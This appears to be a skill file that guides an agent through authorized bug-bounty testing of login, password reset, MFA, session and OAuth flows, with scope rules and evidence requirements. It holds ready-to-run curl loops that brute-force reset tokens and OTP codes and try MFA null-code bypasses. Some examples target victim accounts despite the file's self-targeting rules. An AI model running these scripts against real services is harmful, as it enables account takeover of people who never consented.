---
name: auth_tester
description: Identity and session-management testing — password reset, invites, MFA, passkeys, magic links, email change, account linking, session fixation, logout, OAuth/OIDC state-machine security.
---

# Auth Tester

Authentication and session management bugs are among the highest-impact findings: they lead directly to account takeover, privilege escalation, or lateral movement. This pack systematically tests the entire identity lifecycle: account creation, password reset, email verification, MFA, session handling, and OAuth provider integration.

This pack composes with `shared/scope_guard.md`, `shared/evidence_rules.md`, `packs/oauth_sso_attacker/SKILL.md`, and `packs/triage_validation/SKILL.md`.

## When to Use

- Application has user accounts and authentication flows.
- Password reset, email verification, or magic-link flows are present.
- MFA is offered (SMS, TOTP, U2F, passkeys).
- OAuth / OIDC provider integration exists.
- Email change, account linking, or invite flows are discoverable.
- Session cookies or tokens are used for authentication.

## Operating Rules

- **Authorization scope**: do not target other users' accounts without explicit scope permission. Testing is self-targeting only: create a test account in your own control or the target's sandboxed environment.
- **Token lifecycle**: password-reset tokens, magic links, and session tokens are time-sensitive. Document when you discovered them and what the expected expiration window is.
- **MFA testing**: do not attempt to brute-force OTP codes in production. If testable, use a dedicated OTP generator or test account.
- **Email verification**: if the flow requires email confirmation, use a temporary email service (mailinator, temp-mail) in scope, or coordinate with the program for a test account.

## Phase 0: Auth Flow Enumeration

### 1. Identify authentication mechanisms

```bash
# Check the login page
curl -s https://target.com/login | grep -oE "type=['\"]password|name=['\"][a-z_]+['\"]"

# List visible auth flows
# - Username/password login
# - Social OAuth (Google, GitHub, GitHub)
# - Magic link (email-based)
# - Passwordless (passkeys, WebAuthn)
# - SAML (enterprise)

# Check HTML for auth-related input fields
curl -s https://target.com/login | grep -oE '<input[^>]*name="[^"]*"[^>]*/?' | grep -v "type=hidden"
```

### 2. Trace the password reset flow

```bash
# Navigate to the password reset form
curl -s https://target.com/forgot-password | grep -oE 'form|input|action' | head -5

# Identify the request:
# POST /api/password-reset with email
# Response includes: confirmation message, token sent to email, or magic link

# For magic links: capture the link structure
# Typical: https://target.com/reset?token=<base64_or_uuid>
```

### 3. Enumerate OAuth providers

```bash
# Check for OAuth buttons or hidden integration
curl -s https://target.com/login | grep -iE "oauth|github|google|microsoft|facebook" | head -10

# Document each provider:
# - Client ID (usually visible in JS or HTML)
# - Redirect URI (captured from login flow or discovered in .well-known/openid-configuration)
# - Scopes requested
```

## Phase 1: Password Reset Token Security

### Test token reuse

```bash
# Request a password reset
curl -X POST https://target.com/api/password-reset -d '{"email": "test@example.com"}'

# Check email for the reset link and extract the token
TOKEN="abc123xyz"

# Attempt to use the token multiple times
curl -X POST https://target.com/api/password-reset-confirm \
  -d '{"token": "'$TOKEN'", "new_password": "NewPass123"}'

# Wait and try again with the same token
# If it works, the token can be reused

# Try with an old/expired token from a previous test
# Document the expiration window
```

### Brute-force token space

```bash
# If tokens appear to be sequential (001, 002, 003) or predictable:
for i in {1..1000}; do
  TOKEN=$(printf "%06d" $i)
  curl -s -X POST https://target.com/api/password-reset-confirm \
    -d '{"token": "'$TOKEN'", "new_password": "BrutePass123"}' \
    | grep -q "success" && echo "Found: $TOKEN" && break
done

# If tokens are UUIDs, check for low entropy or patterns
# Example: first half is user ID, second half is timestamp + secret
```

### Test token-less reset

```bash
# Some flows don't include tokens. Instead:
# 1. User requests reset
# 2. User logs in with old password
# 3. System allows password change without verification

# OR: token embedded in the form as a hidden field

# Try removing the token parameter
curl -X POST https://target.com/api/password-reset-confirm \
  -d '{"user_id": "victim_id", "new_password": "Hacked"}'
```

## Phase 2: Magic Link Validation

### Analyze link structure

```bash
# Capture multiple magic links and compare
# Example links:
# https://target.com/login?token=A1B2C3D4E5F6G7H8
# https://target.com/login?token=A1B2C3D4E5F6G7I8
# https://target.com/login?token=A1B2C3D4E5F6G7J8

# Check if token is sequential or based on pattern:
# - Timestamp (monotonically increasing)
# - User ID + secret (extractable)
# - Random (safe) or weak random (breakable)
```

### Predict and test links

```bash
# If tokens appear sequential:
# 1. Request a link for user A
# 2. Note the token value
# 3. Request a link for user B
# 4. Compare the tokens to identify the pattern

# Predict the next token and attempt to use it
curl -s "https://target.com/login?token=PREDICTED_TOKEN"

# If the prediction yields a valid login link, the token is predictable
```

### Test link expiration

```bash
# Request a magic link
curl -X POST https://target.com/api/send-magic-link -d '{"email": "test@example.com"}'

# Extract the link and use it immediately
# Time how long it takes to complete login

# Wait for the documented expiration window (usually 10-30 minutes)
# Try using the same link again
# If it still works, expiration is not enforced

# Document the expiration time window
```

## Phase 3: MFA Bypass Techniques

### Null MFA response

```bash
# Capture the MFA challenge request:
POST /api/auth/mfa-verify
{ "code": "123456", "session_id": "sess_xyz" }

# Attempt to bypass by:
# 1. Sending empty code: { "code": "", "session_id": "sess_xyz" }
# 2. Omitting the code: { "session_id": "sess_xyz" }
# 3. Sending null: { "code": null, "session_id": "sess_xyz" }

for payload in "" "null" "undefined"; do
  curl -s -X POST https://target.com/api/auth/mfa-verify \
    -H "Content-Type: application/json" \
    -d '{"code": "'$payload'", "session_id": "sess_xyz"}' \
    | grep -q "success" && echo "Bypassed with: $payload"
done
```

### Race condition MFA

```bash
# Attempt to login and verify MFA simultaneously

# Send login request
curl -s -X POST https://target.com/api/auth/login \
  -d '{"email": "test@example.com", "password": "password"}' &

# Immediately send MFA verify before server processes the login
curl -s -X POST https://target.com/api/auth/mfa-verify \
  -d '{"code": "000000", "session_id": "incomplete_session"}' &

wait

# If one of the requests succeeds despite incomplete authentication, race condition exists
```

### OTP brute-force window

```bash
# Capture an OTP challenge and attempt brute-force within the acceptance window
# Typical OTP windows: 30-60 seconds

for otp in {000000..999999}; do
  FORMATTED_OTP=$(printf "%06d" $otp)
  curl -s -X POST https://target.com/api/auth/mfa-verify \
    -d '{"code": "'$FORMATTED_OTP'", "session_id": "sess_xyz"}' | \
    grep -q "success" && echo "Found OTP: $FORMATTED_OTP" && break
done
```

### WebAuthn / Passkey bypass

```bash
# If passkeys are offered:
# 1. Check if the challenge is validated
# 2. Verify that the public key is correctly enrolled

# Capture the WebAuthn challenge from the login flow
# Attempt to:
# - Reuse a previous response
# - Craft a minimal response (empty assertion)
# - Submit a response for a different user

# Example: extract and replay a previous passkey response
curl -s -X POST https://target.com/api/auth/passkey-verify \
  -d '{"assertion": "PREVIOUS_ASSERTION", "challenge": "CURRENT_CHALLENGE"}'
```

## Phase 4: Session Fixation

### Pre-set session ID

```bash
# Before authentication, set a session cookie:
curl -b "PHPSESSID=attacker_chosen_value" https://target.com/

# Now authenticate with the pre-set session
curl -b "PHPSESSID=attacker_chosen_value" \
  -X POST https://target.com/api/auth/login \
  -d '{"email": "victim@example.com", "password": "password"}'

# Check if the session ID remains unchanged (session fixation) or is regenerated (safe)
curl -b "PHPSESSID=attacker_chosen_value" https://target.com/account
# If we can access the account with the pre-set session ID, the app is vulnerable
```

### Session ID in URL

```bash
# Some applications pass session IDs in the URL (bad practice)
# Example: https://target.com/account?session=abc123xyz

# Request a login and extract the session ID from the URL
# Pre-send the login URL with a controlled session ID
# If the application accepts it, session fixation is possible
```

## Phase 5: Logout Invalidation

### Test token reuse after logout

```bash
# 1. Login and capture session token
TOKEN="Bearer eyJhbGciOiJIUzI1NiJ..."

# 2. Verify you can access protected endpoint
curl -H "Authorization: $TOKEN" https://target.com/api/account

# 3. Logout
curl -H "Authorization: $TOKEN" -X POST https://target.com/api/auth/logout

# 4. Try to reuse the token
curl -H "Authorization: $TOKEN" https://target.com/api/account

# If the endpoint is still accessible, the token was not invalidated
```

### Cookie invalidation

```bash
# 1. Login and capture session cookie
# 2. Logout and capture the response
# 3. Check if the Set-Cookie header clears the session

# Successful logout should include:
# Set-Cookie: sessionid=; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Path=/

# Verify by attempting to use the old cookie after logout
curl -b "sessionid=old_value_from_before_logout" https://target.com/account
```

## Phase 6: Email Change Flow

### Verify old email confirmation

```bash
# Request an email change
curl -X POST https://target.com/api/account/email-change \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"new_email": "attacker@example.com"}'

# Check the response:
# - Does it require confirming the OLD email first?
# - Does it send a verification link to the NEW email?
# - Can we proceed without confirming?

# If the app sends a link only to the new email and allows changing immediately:
curl -H "Authorization: Bearer $TOKEN" https://target.com/api/account
# Check if email was changed without verification
```

### Email verification link for new email

```bash
# Request an email change to attacker@example.com
# Intercept the verification link (check attacker's email inbox)
# The link should require BOTH:
# 1. Old email confirmation
# 2. New email confirmation

# If only the new email is checked, the attacker can hijack the account
```

## Phase 7: Account Linking and OAuth

### Unverified account linking

```bash
# Flow: User is logged in, clicks "Link Google Account"
# 1. User is redirected to Google OAuth
# 2. User authenticates with Google
# 3. Application links the Google account to the current user

# Test: Link an OAuth account you control
# 1. Log in as victim@example.com
# 2. Click "Link Google Account"
# 3. Authenticate as attacker@gmail.com

# Check if the application linked attacker's Google account to victim's account
# If yes, attacker can now login as victim using their Google account
```

### OAuth state parameter validation

```bash
# Capture an OAuth flow and the state parameter:
# https://oauth.provider.com/authorize?state=random_value&client_id=...

# Intercept the callback:
# https://target.com/oauth/callback?code=auth_code&state=random_value

# Attempt to bypass by:
# 1. Removing the state parameter
# 2. Modifying the state value
# 3. Replaying an old state from a different user

# If the application doesn't validate state, CSRF on the OAuth flow is possible
```

## Phase 8: Privilege Escalation in Auth

### Admin account registration

```bash
# If the application allows registration:
# - Check if you can register with email like "admin@target.com"
# - Check if you can register with a role parameter: {"email": "...", "role": "admin"}
# - Check if the first registered user becomes admin (account enumeration)
```

### Token hijacking via invite

```bash
# If invites are sent:
# 1. Request an invite to an email you control
# 2. Extract the invite token
# 3. Try to use it with a different email address
# 4. Check if you can claim an admin invite on a non-admin account
```

## Submission Gates

Run `packs/triage_validation/SKILL.md` 7-Question gate. Then for this class:

- [ ] Password reset token tested for reuse, expiration, and predictability.
- [ ] Magic link tested for token strength and expiration.
- [ ] MFA bypass attempted via null response, race condition, or OTP brute-force.
- [ ] Session fixation tested by pre-setting session ID.
- [ ] Logout invalidation tested; token reuse after logout confirmed or denied.
- [ ] Email change flow tested for unverified email updates.
- [ ] Account linking tested for privilege escalation.
- [ ] OAuth state parameter validation tested for CSRF.
- [ ] All findings reproducible and self-targeting (test account only).

## Evidence

Store under run artifact root, named `auth_<flow>_<timestamp>/`:

- `01_auth_flows.txt` — enumerated authentication mechanisms (login, reset, OAuth, MFA).
- `02_password_reset_test.log` — token reuse, expiration, brute-force results.
- `03_magic_link_analysis.txt` — token patterns, predictability assessment, expiration testing.
- `04_mfa_bypass_test.log` — null response, race condition, OTP brute-force results.
- `05_session_analysis.txt` — session fixation test, ID regeneration, cookie handling.
- `06_logout_test.log` — token invalidation and cookie clearing verification.
- `07_email_change_test.txt` — email verification flow, old email confirmation requirement.
- `08_oauth_analysis.txt` — state parameter validation, account linking test results.
- `09_privilege_escalation_test.txt` — admin registration, invite hijacking attempts.
- `README.md` — summary table per `shared/evidence_rules.md`.

## Exclusions

- No unauthorized access to other users' accounts (self-targeting only).
- No session hijacking of other users.
- No account takeover beyond proof-of-concept.
- No persistence or configuration changes.
- Do not brute-force OTP codes in production unless in sandboxed environment.

## See Also

- `agent_skills/packs/oauth_sso_attacker/SKILL.md` — OAuth/OIDC attack matrix (state bypass, PKCE downgrade, key confusion)
- `agent_skills/packs/web_hunter/SKILL.md` — endpoint discovery (extends to auth-related endpoints)
- `agent_skills/packs/race_hunter/SKILL.md` — race conditions (applies to concurrent MFA and login)
- `agent_skills/packs/triage_validation/SKILL.md` — submission gates and evidence discipline
- External tools: intercepting web proxy, headless browser automation, oathtool, hardware-key manager.

